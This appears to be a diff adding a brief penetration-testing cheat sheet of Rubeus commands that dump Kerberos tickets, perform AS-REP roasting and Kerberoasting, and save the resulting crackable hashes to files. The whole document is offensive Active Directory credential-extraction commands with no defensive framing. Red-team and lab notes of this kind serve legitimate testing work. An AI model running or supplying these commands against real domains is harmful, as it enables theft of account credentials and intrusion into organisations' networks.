@@ -1,0 +1,11 @@
+Common Commands
+
+.\Rubeus.exe dump /nowrap
+
+.\Rubeus.exe asreproast /nowrap
+
+.\Rubeus.exe asreproast /outfile:hashes.asreproast
+
+.\Rubeus.exe kerberoast /nowrap
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
